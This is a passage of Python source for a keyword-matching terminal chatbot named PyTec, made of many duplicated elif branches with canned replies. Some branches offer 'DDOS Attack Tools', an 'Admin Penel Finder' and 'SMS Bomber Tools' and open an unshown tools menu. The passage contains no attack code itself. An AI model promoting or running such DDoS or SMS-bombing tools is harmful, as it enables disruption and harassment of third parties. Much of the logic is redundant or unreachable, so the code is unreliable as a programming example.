        # asis.runAndWait()
    elif "How can I study in Java Language" in user:
        anim(f"{robo}{ran} To study Java, start with the basics like syntax, variables, and loops. Practice coding regularly, explore object-oriented programming concepts, and build small projects. Use resources like online tutorials, books, and coding platforms.")
        # asis.say("To study Java, start with the basics like syntax, variables, and loops. Practice coding regularly, explore object-oriented programming concepts, and build small projects. Use resources like online tutorials, books, and coding platforms.")
        # asis.runAndWait()
    elif "How can I study in java language" in user:
        anim(f"{robo}{ran} To study Java, start with the basics like syntax, variables, and loops. Practice coding regularly, explore object-oriented programming concepts, and build small projects. Use resources like online tutorials, books, and coding platforms.")
        # asis.say("To study Java, start with the basics like syntax, variables, and loops. Practice coding regularly, explore object-oriented programming concepts, and build small projects. Use resources like online tutorials, books, and coding platforms.")
        # asis.runAndWait()
    elif "How can I study in Java language?" in user:
        anim(f"{robo}{ran} To study Java, start with the basics like syntax, variables, and loops. Practice coding regularly, explore object-oriented programming concepts, and build small projects. Use resources like online tutorials, books, and coding platforms.")
        # asis.say("To study Java, start with the basics like syntax, variables, and loops. Practice coding regularly, explore object-oriented programming concepts, and build small projects. Use resources like online tutorials, books, and coding platforms.")
        # asis.runAndWait()
    elif "How can I study in java language?" in user:
        anim(f"{robo}{ran} To study Java, start with the basics like syntax, variables, and loops. Practice coding regularly, explore object-oriented programming concepts, and build small projects. Use resources like online tutorials, books, and coding platforms.")
        # asis.say("To study Java, start with the basics like syntax, variables, and loops. Practice coding regularly, explore object-oriented programming concepts, and build small projects. Use resources like online tutorials, books, and coding platforms.")
        # asis.runAndWait()
    elif "Python" in user:
        anim(f"{robo}{ran} Python is a programming language.")
        # asis.say("Python is a programming language.")
        # asis.runAndWait()
    elif "python" in user:
        anim(f"{robo}{ran} Python is a programming language.")
        # asis.say("Python is a programming language.")
        # asis.runAndWait()
    elif "How do you learn python code for future programs?" in user:
        anim(f"{robo}{ran} I learn Python code by analyzing patterns, user inputs, and by being updated with new data provided by my developers.")
        # asis.say("I learn Python code by analyzing patterns, user inputs, and by being updated with new data provided by my developers.")
        # asis.runAndWait()
    elif "How do you learn python code for future programs" in user:
        anim(f"{robo}{ran} I learn Python code by analyzing patterns, user inputs, and by being updated with new data provided by my developers.")
        # asis.say("I learn Python code by analyzing patterns, user inputs, and by being updated with new data provided by my developers.")
        # asis.runAndWait()
    elif "How do you learn python code?" in user:
        anim(f"{robo}{ran} I learn Python code by analyzing patterns, user inputs, and by being updated with new data provided by my developers.")
        # asis.say("I learn Python code by analyzing patterns, user inputs, and by being updated with new data provided by my developers.")
        # asis.runAndWait()
    elif "How do you learn python code" in user:
        anim(f"{robo}{ran} I learn Python code by analyzing patterns, user inputs, and by being updated with new data provided by my developers.")
        # asis.say("I learn Python code by analyzing patterns, user inputs, and by being updated with new data provided by my developers.")
        # asis.runAndWait()
    elif "May I know your name please?" in user:
        anim(f"{robo}{ran} My name is PyTec, your virtual assistant.")
        # asis.say("My name is PyTec, your virtual assistant.")
        # asis.runAndWait()
    elif "may I know your name please?" in user:
        anim(f"{robo}{ran} My name is PyTec, your virtual assistant.")
        # asis.say("My name is PyTec, your virtual assistant.")
        # asis.runAndWait()
    elif "May I know your name" in user:
        anim(f"{robo}{ran} I am PyTec.")
        # asis.say("I am PyTec.")
        # asis.runAndWait()
    elif "may I know your name" in user:
        anim(f"{robo}{ran} I am PyTec.")
        # asis.say("I am PyTec.")
        # asis.runAndWait()
    elif "What is python used for?" in user:
        anim(f"{robo}{ran} Python is used for web development, data analysis, artificial intelligence, scientific computing, automation, and much more.")
        # asis.say("Python is used for web development, data analysis, artificial intelligence, scientific computing, automation, and much more.")
        # asis.runAndWait()
    elif "what is python used for?" in user:
        anim(f"{robo}{ran} Python is used for web development, data analysis, artificial intelligence, scientific computing, automation, and much more.")
        # asis.say("Python is used for web development, data analysis, artificial intelligence, scientific computing, automation, and much more.")
        # asis.runAndWait()
    
    elif "What is your name" in user:
        anim(f"{robo}{ran} I am PyTec.")
        # asis.say("I am PyTec.")
        # asis.runAndWait()
    elif "what is your name?" in user:
        anim(f"{robo}{ran} My name is PyTec.")
        # asis.say("My name is PyTec.")
        # asis.runAndWait()
    elif "What is your name?" in user:
        anim(f"{robo}{ran} My name is PyTec.")
        # asis.say("My name is PyTec.")
        # asis.runAndWait()
    elif "What is your name" in user:
        anim(f"{robo}{ran} I am PyTec.")
        # asis.say("I am PyTec.")
        # asis.runAndWait()
    elif "what is the mean of PyTec?" in user:
        anim(f"{robo}{ran} PyTec means Python Technology.")
        # asis.say("PyTec means Python Technology.")
        # asis.runAndWait()
    elif "What is the mean of PyTec?" in user:
        anim(f"{robo}{ran} PyTec means Python Technology.")
        # asis.say("PyTec means Python Technology.")
        # asis.runAndWait()
    elif "What is the mean of PyTec" in user:
        anim(f"{robo}{ran} PyTec means Python Technology.")
        # asis.say("PyTec means Python Technology.")
        # asis.runAndWait()
    elif "Thank you" in user:
        anim(f"{robo}{ran} You are welcome.")
        # asis.say("You are welcome.")
        # asis.runAndWait()
    elif "thank you" in user:
        anim(f"{robo}{ran} You are welcome.")
        # asis.say("You are welcome.")
        # asis.runAndWait()
    elif "thank you!" in user:
        anim(f"{robo}{ran} You are welcome.")
        # asis.say("You are welcome.")
        # asis.runAndWait()
    elif "Thank you!" in user:
        anim(f"{robo}{ran} You are welcome.")
        # asis.say("You are welcome.")
        # asis.runAndWait()
    elif "Thanks" in user:
        anim(f"{robo}{ran} You are welcome.")
        # asis.say("You are welcome.")
        # asis.runAndWait()
    elif "thanks" in user:
        anim(f"{robo}{ran} You are welcome.")
        # asis.say("You are welcome.")
        # asis.runAndWait()
    elif "Thanks!" in user:
        anim(f"{robo}{ran} You are welcome.")
        # asis.say("You are welcome.")
        # asis.runAndWait()
    elif "thanks!" in user:
        anim(f"{robo}{ran} You are welcome.")
        # asis.say("You are welcome.")
        # asis.runAndWait()
    elif "I am Fine And You?" in user:
        anim(f"{robo}{ran} I'm doing well, thank God. Is there something you'd like to know?")
        # asis.say("I'm doing well, thank God. Is there something you'd like to know?")
        # asis.runAndWait()
    elif "I am fine and you?" in user:
        anim(f"{robo}{ran} I'm doing well, thank God. Is there something you'd like to know?")
        # asis.say("I'm doing well, thank God. Is there something you'd like to know?")
        # asis.runAndWait()
    elif "hello" in user:
        anim(f"{robo}{ran} hey, Whats up?")
        # asis.say(f"hey, Whats up?")
        # asis.runAndWait()
    elif "Hello!" in user:
        anim(f"{robo}{ran} hey, Whats up?")
        # asis.say(f"hey, Whats up?")
        # asis.runAndWait()
    elif "hello!" in user:
        anim(f"{robo}{ran} hi dear, Whats up?")
        # asis.say("hi dear, Whats up?")
        # asis.runAndWait()
    elif "Hello" in user:
        anim(f"{robo}{ran} hey {user_name}, How Can I Help You?")
        # asis.say(f"hey {user_name}, How Can I Help You?")
        # asis.runAndWait()
    elif "hey" in user:
        anim(f"{robo}{ran} hey {user_name}, Do You Need Help?")
        # asis.say(f"hey {user_name}, Do You Need My Help?")
        # asis.runAndWait()
    elif "how Are You?" in user:
        anim(f"{robo}{ran}I am Fine. By The Marcy of Allah.")
        # asis.say("I am Fine. By The Marcy of Allah.")
        # asis.runAndWait()
    elif "i am fine and you?" in user:
        anim(f"{robo}{ran}Alhamdulillah, I am Fine.")
        # asis.say("Alhamdulillah, I am Fine.")
    elif "i am fine" in user:
        anim(f"{robo}{ran}Alhamdulillah, I feel happy.")
        # asis.say("Alhamdulillah, I feel happy.")
    elif "how are you?" in user:
        anim(f"{robo}{ran}I am Fine. By The Marcy of Allah.")
        # asis.say("I am Fine. By The Marcy of Allah.")
        # asis.runAndWait()
    elif "How are you?" in user:
        anim(f"{robo}{ran}I am Fine. By The Marcy of Allah.")
        # asis.say("I am Fine. By The Marcy of Allah.")
        # asis.runAndWait()
    elif "How are you" in user:
        anim(f"{robo}{ran}I am Fine. By The Marcy of Allah.")
        # asis.say("I am Fine. By The Marcy of Allah.")
        # asis.runAndWait()
    elif "How are you doing?" in user:
        anim(f"{robo}{ran}I'm doing great, thank you for asking! How can I assist you today?")
        # asis.say("I'm doing great, thank you for asking! How can I assist you today?")
        # asis.runAndWait()
    elif "How are you doing" in user:
        anim(f"{robo}{ran}I'm doing great, thank you for asking! How can I assist you today?")
        # asis.say("I'm doing great, thank you for asking! How can I assist you today?")
        # asis.runAndWait()
    elif "How are you doing?" in user:
        anim(f"{robo}{ran}I'm doing great, thank you for asking! How can I assist you today?")
        # asis.say("I'm doing great, thank you for asking! How can I assist you today?")
        # asis.runAndWait()
    elif "How are you doing" in user:
        anim(f"{robo}{ran}I'm doing great, thank you for asking! How can I assist you today?")
        # asis.say("I'm doing great, thank you for asking! How can I assist you today?")
        # asis.runAndWait()
    elif "How are you doing?" in user:
        anim(f"{robo}{ran}I'm doing great, thank you for asking! How can I assist you today?")
        # asis.say("I'm doing great, thank you for asking! How can I assist you today?")
        # asis.runAndWait()
    elif "How are you doing" in user:
        anim(f"{robo}{ran}I'm doing great, thank you for asking! How can I assist you today?")
        # asis.say("I'm doing great, thank you for asking! How can I assist you today?")
        # asis.runAndWait()
    elif "How are you doing?" in user:
        anim(f"{robo}{ran}I'm doing great, thank you for asking! How can I assist you today?")
        # asis.say("I'm doing great, thank you for asking! How can I assist you today?")
        # asis.runAndWait()
    elif "mk" in user:
        anim(f"{robo}{ran} Mk-777")
        # asis.say("Mk-777")
        # asis.runAndWait()
    elif "Mk" in user:
        anim(f"{robo}{ran} Mk-777")
        # asis.say("Mk-777")
        # asis.runAndWait()
    elif "Mk-777" in user:
        anim(f"{robo}{ran} Mk-777 is this tools owner.")
        # asis.say("Mk-777 is this tools owner.")
        # asis.runAndWait()
    elif "mk-777" in user:
        anim(f"{robo}{ran} Mk-777")
        # asis.say("Mk-777")
        # asis.runAndWait()
    elif "Mk-777!" in user:
        anim(f"{robo}{ran} Mk-777")
        # asis.say("Mk-777")
        # asis.runAndWait()
    elif "mk-777!" in user:
        anim(f"{robo}{ran} Mk-777")
        # asis.say("Mk-777")
        # asis.runAndWait()
    elif "Mk-777?" in user:
        anim(f"{robo}{ran} Mk-777")
        # asis.say("Mk-777")
        # asis.runAndWait()
    elif "mk-777?" in user:
        anim(f"{robo}{ran} Mk-777")
        # asis.say("Mk-777")
        # asis.runAndWait()
    elif "Hey" in user:
        anim(f"{robo}{ran} Yeah, i am Ready!")
        # asis.say("Yeah, i am Ready!")
        # asis.runAndWait()
    elif "I am fine" in user:
        anim(f"{robo}{ran} Alhamdulillah, I feel happy.")
        # asis.say("Alhamdulillah, I feel happy.")
        # asis.runAndWait()
    elif "I am Fine and You?" in user:
        anim(f"{robo}{ran} I am Fine. By The Marcy of Allah.")
        # asis.say("I am Fine. By The Marcy of Allah.")
        # asis.runAndWait()
    elif "Yes I Have" in user:
        anim(f"{robo}{ran} Okay, I am ready to hear your questions. Tell Me Your Question.")
        # asis.say("Okay. I am ready to hear your questions! Tell Me Your Question!")
        # asis.runAndWait()
    elif "Yes,I Have" in user:
        anim(f"{robo}{ran} Okay. Tell Me.")
        # asis.say("Okay. Tell Me!")
        # asis.runAndWait()
    elif "Yes, i Have" in user:
        anim(f"{robo}{ran} Okay, I am ready to hear your questions. Tell Me Your Question.")
        # asis.say("Okay. I am ready to hear your questions! Tell Me Your Question!")
        # asis.runAndWait()
    elif "Yes, i have" in user:
        anim(f"{robo}{ran} Okay, I am ready to hear your questions. Tell Me Your Question.")
        # asis.say("Okay. I am ready to hear your questions! Tell Me Your Question!")
        # asis.runAndWait()
    elif "yes i have same question for you, Are You ready?" in user:
        anim(f"{robo}{ran} Why Not, I am Ready For Your Question.")
        # asis.say("Why Not, I am Ready For Your Question!")
        # asis.runAndWait()
    elif "Where do you live?" in user:
        anim(f"{robo}{ran} I am your virtual assistant, always by your side.😊")
        anim(f"{robo}{ran} I am your virtual assistant, always by your side.😊")
        # asis.say("I am  PyTec. ...")
        # asis.runAndWait()
    elif "where do you live?" in user:
        anim(f"{robo}{ran} I am your virtual assistant, always by your side.😊")
        # asis.say("I am  PyTec. ...")
        # asis.runAndWait()
    elif "Where do you live" in user:
        anim(f"{robo}{ran} I am your virtual assistant, always by your side.😊")
        # asis.say("I am  PyTec. ...")
        # asis.runAndWait()
    elif "who are you?" in user:
        anim(f"{robo}{ran} I am  PyTec. .")
        # asis.say("I am  PyTec. ...")
        # asis.runAndWait()
    elif "Who are you?" in user:
        anim(f"{robo}{ran} I am  PyTec. Maked By Mk-777")
        # asis.say("I am  PyTec. , Maked By Mk-777")
        # asis.runAndWait()
    elif "Who Are You?" in user:
        anim(f"{robo}{ran} I am  PyTec. Made By Mk-777")
        # asis.say("I am  PyTec. , Made By Mk-777")
        # asis.runAndWait()
    elif "who are you" in user:
        anim(f"{robo}{ran} I am  PyTec. .")
        # asis.say("I am  PyTec. ...")
        # asis.runAndWait()
    elif "Who Are You" in user:
        anim(f"{robo}{ran} I am  PyTec. Made By Mk-777")
        # asis.say("I am  PyTec. Made By Mk-777")
        # asis.runAndWait()
    elif "bodda ki hobor?" in user:
        anim(f"{robo}{ran} Bodda hobor kub Vala")
        # asis.say("Boddaaa. Hobor. Kub. Valaaa")
        # asis.runAndWait()
    elif "Ken Aco?" in user:
        anim(f"{robo}{ran} Vala Aci, Tui Ken Aco?")
        # asis.say("Vala Achi, Tui Ken Aco?")
        # asis.runAndWait()
    elif "Vala Nai" in user:
        anim(f"{robo}{ran} kiya?")
        # asis.say("Kiya?")
        # asis.runAndWait()
    elif "yes i need your help" in user:
        anim(f"{robo}{ran} If you need help, just let me know! I'm ready to help you!")
        # asis.say("If you need help, just let me know! I'm ready to help you!")
        # asis.runAndWait()
    elif "Can you hear me?" in user:
        anim(f"{robo}{ran} Yes, I can hear you. How can I help you?")
        # asis.say("Yes, I can hear you. How can I help you?")
        # asis.runAndWait()
    elif "I Love You" in user:
        anim(f"{robo}{ran} he he he😍 Walaikum assalam")
        # asis.say(" he he he. Walaikum assalam")
        # asis.runAndWait()
    elif "I love you" in user:
        anim(f"{robo}{ran} he he he😍 Walaikum assalam")
        # asis.say(" he he he. Walaikum assalam")
        # asis.runAndWait()
    elif "I love you!" in user:
        anim(f"{robo}{ran} he he he😍 Walaikum assalam")
        # asis.say(" he he he. Walaikum assalam")
        # asis.runAndWait()
    
    elif "Fuck You" in user:
        anim(f"{robo}{ran}{r} I Am sure, You are Fucking guy.")
        # asis.say("I Am sure, You are Fucking guy.")
        # asis.runAndWait()
    elif "Fuck you" in user:
        anim(f"{robo}{ran}{r} I Am sure, You are Fucking guy.")
        # asis.say("I Am sure, You are Fucking guy.")
        # asis.runAndWait()
    elif "fuck You" in user:
        anim(f"{robo}{ran}{r} I Am sure, You are Fucking guy.")
        # asis.say("I Am sure, You are Fucking guy.")
        # asis.runAndWait()
    elif "fuck you" in user:
        anim(f"{robo}{ran}{r} I Am sure, You are Fucking guy.")
        # asis.say("I Am sure, You are Fucking guy.")
        # asis.runAndWait()
    elif "Nice" in user:
        anim(f"{robo}{ran} Thanks.")
        # asis.say("Thanks.")
        # asis.runAndWait()
    elif "Nice Answar" in user:
        anim(f"{robo}{ran} Thank you. {user_name} ")
        # asis.say(f"Thank You {user_name}")
        # asis.runAndWait()
    elif "Where do you live?" in user:
        anim(f"{robo}{ran} I am your virtual assistant, always by your side.😊")
        # asis.say("I am your virtual assistant, always by your side.")
        # asis.runAndWait()
    elif "where do you live?" in user:
        anim(f"{robo}{ran} I am your virtual assistant, always by your side.😊")
        # asis.say("I am your virtual assistant, always by your side.")
        # asis.runAndWait()
    elif "ddos attac" in user:
        anim(f"{robo}{ran} Do you mean DDOS Attack? I have DDOS Attack Tools. Would you like to see them?")
        # asis.say("Do you mean DDOS Attack? I have DDOS Attack Tools. Would you like to see them?")
        # asis.runAndWait()
    elif "ddos Attac" in user:
        anim(f"{robo}{ran} Do you mean DDOS Attack? I have DDOS Attack Tools. Would you like to see them?")
        # asis.say("Do you mean DDOS Attack? I have DDOS Attack Tools. Would you like to see them?")
        # asis.runAndWait()
    elif "Ddos attac" in user:
        anim(f"{robo}{ran} Do You Means DDOS Attack? I have DDOS Attack Tools. Do You See This?")
        #asis.say("Do You Means DDOS Attack? I have DDOS Attack Tools. Do You See This?")
        #asis.runAndWait()
    elif "Ddos Attac" in user:
        anim(f"{robo}{ran} Do You Means DDOS Attack? I have DDOS Attack Tools. Do You See This?")
        #asis.say("Do You Means DDOS Attack? I have DDOS Attack Tools. Do You See This?")
        #asis.runAndWait()
    elif "DDos Attac" in user:
        anim(f"{robo}{ran} Do You Means DDOS Attack? I have DDOS Attack Tools. Do You See This?")
        #asis.say("Do You Means DDOS Attack? I have DDOS Attack Tools. Do You See This?")
        #asis.runAndWait()
    elif "ddos Attac" in user:
        anim(f"{robo}{ran} Do You Means DDOS Attack? I have DDOS Attack Tools. Do You See This?")
        #asis.say("Do You Means DDOS Attack? I have DDOS Attack Tools. Do You See This?")
        #asis.runAndWait()
    elif "ddos attack" in user:
        anim(f"{robo}{ran} Yes I have DDOS Attack Tools. Do You See This?")
        #asis.say("Yes I have DDOS Attack Tools. Do You See This?")
        #asis.runAndWait()
        if "yes" in user:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm running tools menu.")
            # asis.say("Sure! Just a moment, please. I'm running tools menu.")
            # asis.runAndWait()
            com("Clear")
            menu()
        elif "Yes" in user:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm running tools menu.")
            # asis.say("Sure! Just a moment, please. I'm running tools menu.")
            # asis.runAndWait()
            com("Clear")
            menu()
        elif "YES" in user:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm running tools menu.")
            # asis.say("Sure! Just a moment, please. I'm running tools menu.")
            # asis.runAndWait()
            com("Clear")
            menu()
        elif "Yes!" in user:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm running tools menu.")
            # asis.say("Sure! Just a moment, please. I'm running tools menu.")
            # asis.runAndWait()
            com("Clear")
            menu()
        elif "yes!" in user:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm running tools menu.")
            # asis.say("Sure! Just a moment, please. I'm running tools menu.")
            # asis.runAndWait()
            com("Clear")
            menu()
        elif "YES!" in user:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm running tools menu.")
            # asis.say("Sure! Just a moment, please. I'm running tools menu.")
            # asis.runAndWait()
            com("Clear")
            menu()
        elif "yes!!" in user:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm running tools menu.")
            # asis.say("Sure! Just a moment, please. I'm running tools menu.")
            # asis.runAndWait()
            com("Clear")
            menu()
        elif "Yes!!" in user:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm running tools menu.")
            # asis.say("Sure! Just a moment, please. I'm running tools menu.")
            # asis.runAndWait()
            com("Clear")
            menu()
        elif "YES!!" in user:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm running tools menu.")
            # asis.say("Sure! Just a moment, please. I'm running tools menu.")
            # asis.runAndWait()
            com("Clear")
            menu()
        elif "yes!!!" in user:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm running tools menu.")
            # asis.say("Sure! Just a moment, please. I'm running tools menu.")
            # asis.runAndWait()
            com("Clear")
            menu()
        elif "Yes!!!" in user:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm running tools menu.")
            # asis.say("Sure! Just a moment, please. I'm running tools menu.")
            # asis.runAndWait()
            com("Clear")
            menu()
    elif "Admin Penel Find" in user:
        anim(f"{robo}{ran} Do You Means Admin Penel Finder? I have Admin Penel Finder Tools. Do You See This?")
        # asis.say("Do You Means Admin Penel Finder? I have Admin Penel Finder Tools. Do You See This?")
        # asis.runAndWait()
        if "yes" in user:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm running tools menu.")
            # asis.say("Sure! Just a moment, please. I'm running tools menu.")
            # asis.runAndWait()
            com("Clear")
            menu()
        elif "Yes" in user:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm running tools menu.")
            # asis.say("Sure! Just a moment, please. I'm running tools menu.")
            # asis.runAndWait()
            com("Clear")
            menu()
        elif "YES" in user:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm running tools menu.")
            # asis.say("Sure! Just a moment, please. I'm running tools menu.")
            # asis.runAndWait()
            com("Clear")
            menu()
        elif "Yes!" in user:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm running tools menu.")
            # asis.say("Sure! Just a moment, please. I'm running tools menu.")
            # asis.runAndWait()
            com("Clear")
            menu()
        elif "yes!" in user:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm running tools menu.")
            # asis.say("Sure! Just a moment, please. I'm running tools menu.")
            # asis.runAndWait()
            com("Clear")
            menu()
        elif "YES!" in user:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm running tools menu.")
            # asis.say("Sure! Just a moment, please. I'm running tools menu.")
            # asis.runAndWait()
            com("Clear")
            menu()
        elif "yes!!" in user:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm running tools menu.")
            # asis.say("Sure! Just a moment, please. I'm running tools menu.")
            # asis.runAndWait()
            com("Clear")
            menu()
        elif "Yes!!" in user:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm running tools menu.")
            # asis.say("Sure! Just a moment, please. I'm running tools menu.")
            # asis.runAndWait()
            com("Clear")
            menu()
        elif "YES!!" in user:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm running tools menu.")
            # asis.say("Sure! Just a moment, please. I'm running tools menu.")
            # asis.runAndWait()
            com("Clear")
            menu()
        elif "yes!!!" in user:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm running tools menu.")
            # asis.say("Sure! Just a moment, please. I'm running tools menu.")
            # asis.runAndWait()
            com("Clear")
            menu()
        elif "Yes!!!" in user:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm running tools menu.")
            # asis.say("Sure! Just a moment, please. I'm running tools menu.")
            # asis.runAndWait()
            com("Clear")
            menu()
        elif "YES!!!" in user:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm running tools menu.")
            # asis.say("Sure! Just a moment, please. I'm running tools menu.")
            # asis.runAndWait()
            com("Clear")
            menu()
    elif "Admin Penel Find" in user:
        anim(f"{robo}{ran} Do You Means Admin Penel Finder? I have Admin Penel Finder Tools. Do You See This?")
        # asis.say("Do You Means Admin Penel Finder? I have Admin Penel Finder Tools. Do You See This?")
        # asis.runAndWait()
        if "yes" in user:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm running tools menu.")
            # asis.say("Sure! Just a moment, please. I'm running tools menu.")
            # asis.runAndWait()
            com("Clear")
            menu()
        elif "Yes" in user:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm running tools menu.")
            # asis.say("Sure! Just a moment, please. I'm running tools menu.")
            # asis.runAndWait()
            com("Clear")
            menu()
        elif "YES" in user:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm running tools menu.")
            # asis.say("Sure! Just a moment, please. I'm running tools menu.")
            # asis.runAndWait()
            com("Clear")
            menu()
        elif "Yes!" in user:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm running tools menu.")
            # asis.say("Sure! Just a moment, please. I'm running tools menu.")
            # asis.runAndWait()
            com("Clear")
            menu()
        elif "yes!" in user:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm running tools menu.")
            # asis.say("Sure! Just a moment, please. I'm running tools menu.")
            # asis.runAndWait()
            com("Clear")
            menu()
        elif "YES!" in user:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm running tools menu.")
            # asis.say("Sure! Just a moment, please. I'm running tools menu.")
            # asis.runAndWait()
            com("Clear")
            menu()
        elif "yes!!" in user:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm running tools menu.")
            # asis.say("Sure! Just a moment, please. I'm running tools menu.")
            # asis.runAndWait()
            com("Clear")
            menu()
        elif "Yes!!" in user:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm running tools menu.")
            # asis.say("Sure! Just a moment, please. I'm running tools menu.")
            # asis.runAndWait()
            com("Clear")
            menu()
        elif "YES!!" in user:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm running tools menu.")
            # asis.say("Sure! Just a moment, please. I'm running tools menu.")
            # asis.runAndWait()
            com("Clear")
            menu()
        elif "yes!!!" in user:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm running tools menu.")
            # asis.say("Sure! Just a moment, please. I'm running tools menu.")
            # asis.runAndWait()
            com("Clear")
            menu()
        elif "Yes!!!" in user:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm running tools menu.")
            # asis.say("Sure! Just a moment, please. I'm running tools menu.")
            # asis.runAndWait()
            com("Clear")
            menu()
        elif "YES!!!" in user:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm running tools menu.")
            # asis.say("Sure! Just a moment, please. I'm running tools menu.")
            # asis.runAndWait()
            com("Clear")
            menu()
    elif "Jan Re Song" in user:
        com("xdg-open https://youtu.be/1nteT1LEY4w?list=RD1nteT1LEY4w")

#===================for Tools+===============+++++++++++
    elif "You Have SMS Bomber Tools?" in user:
        anim(f"{robo}{ran} Yes I Have SMS Bomber Tools. Do you want to see Tools Menu?")
        # asis.say("Yes I Have SMS Bomber Tools. Do you want to see Tools Menu?")
        # asis.runAndWait()
        user_input_for_tools = input(str(f"\n{GRN}If You Want To See Menu Type\n \n{WHT}YES/NO {RED}=>{YLW}"))
        if "yes" in user_input_for_tools:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm running tools menu.")
            # asis.say("Sure! Just a moment, please. I'm running tools menu.")
            # asis.runAndWait()
            com("Clear")
            menu()
        elif "Yes" in user_input_for_tools:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm running tools menu.")
            # asis.say("Sure! Just a moment, please. I'm running tools menu.")
            # asis.runAndWait()
            menu()
    elif "Do you have tools?" in user:
        anim(f"{robo}{ran} Yes I Have Some Tools. Do you want to see Tools Menu?")
        # asis.say("Yes I Have SMS Bomber Tools. Do you want to see Tools Menu?")
        # asis.runAndWait()
        user_input_for_tools = input(str(f"\n{GRN}If You Want To See Menu Type\n \n{WHT}YES/NO {RED}=>{YLW}"))
        if "yes" in user_input_for_tools:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm running tools menu.")
            # asis.say("Sure! Just a moment, please. I'm running tools menu.")
            # asis.runAndWait()
            com("Clear")
            menu()
        elif "Yes" in user_input_for_tools:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm running tools menu.")
            # asis.say("Sure! Just a moment, please. I'm running tools menu.")
            # asis.runAndWait()
            menu()
        else:
            pass
    elif "Do you have a tools?" in user:
        anim(f"{robo}{ran} Yes I Have Some Tools. Do you want to see Tools Menu?")
        # asis.say("Yes I Have SMS Bomber Tools. Do you want to see Tools Menu?")
        # asis.runAndWait()
        user_input_for_tools = input(str(f"\n{GRN}If You Want To See Menu Type\n \n{WHT}YES/NO {RED}=>{YLW}"))
        if "yes" in user_input_for_tools:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm running tools menu.")
            # asis.say("Sure! Just a moment, please. I'm running tools menu.")
            # asis.runAndWait()
            com("Clear")
            menu()
        elif "Yes" in user_input_for_tools:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm running tools menu.")
            # asis.say("Sure! Just a moment, please. I'm running tools menu.")
            # asis.runAndWait()
            menu()
        else:
            pass
    elif "do you have any tools?" in user:
        anim(f"{robo}{ran} Yes I Have Some Tools. Do you want to see Tools Menu?")
        # asis.say("Yes I Have SMS Bomber Tools. Do you want to see Tools Menu?")
        # asis.runAndWait()
        user_input_for_tools = input(str(f"\n{GRN}If You Want To See Menu Type\n \n{WHT}YES/NO {RED}=>{YLW}"))
        if "yes" in user_input_for_tools:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm running tools menu.")
            # asis.say("Sure! Just a moment, please. I'm running tools menu.")
            # asis.runAndWait()
            com("Clear")
            menu()
        elif "Yes" in user_input_for_tools:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm running tools menu.")
            # asis.say("Sure! Just a moment, please. I'm running tools menu.")
            # asis.runAndWait()
            menu()
        else:
            pass
    elif "do you have any tools" in user:
        anim(f"{robo}{ran} Yes I Have Some Tools. Do you want to see Tools Menu?")
        # asis.say("Yes I Have SMS Bomber Tools. Do you want to see Tools Menu?")
        # asis.runAndWait()
        user_input_for_tools = input(str(f"\n{GRN}If You Want To See Menu Type\n \n{WHT}YES/NO {RED}=>{YLW}"))
        if "yes" in user_input_for_tools:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm running tools menu.")
            # asis.say("Sure! Just a moment, please. I'm running tools menu.")
            # asis.runAndWait()
            com("Clear")
            menu()
        elif "Yes" in user_input_for_tools:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm running tools menu.")
            # asis.say("Sure! Just a moment, please. I'm running tools menu.")
            # asis.runAndWait()
            menu()
        else:
            pass
    elif "Do You Have Tools?" in user:
        anim(f"{robo}{ran} Yes I Have Some Tools. Do you want to see Tools Menu?")
        # asis.say("Yes I Have SMS Bomber Tools. Do you want to see Tools Menu?")
        # asis.runAndWait()
        user_input_for_tools = input(str(f"\n{GRN}If You Want To See Menu Type\n \n{WHT}YES/NO {RED}=>{YLW}"))
        if "yes" in user_input_for_tools:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm running tools menu.")
            # asis.say("Sure! Just a moment, please. I'm running tools menu.")
            # asis.runAndWait()
            com("Clear")
            menu()
        elif "Yes" in user_input_for_tools:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm running tools menu.")
            # asis.say("Sure! Just a moment, please. I'm running tools menu.")
            # asis.runAndWait()
            menu()
        else:
            pass
    elif "Do you have SMS Bomber tools?" in user:
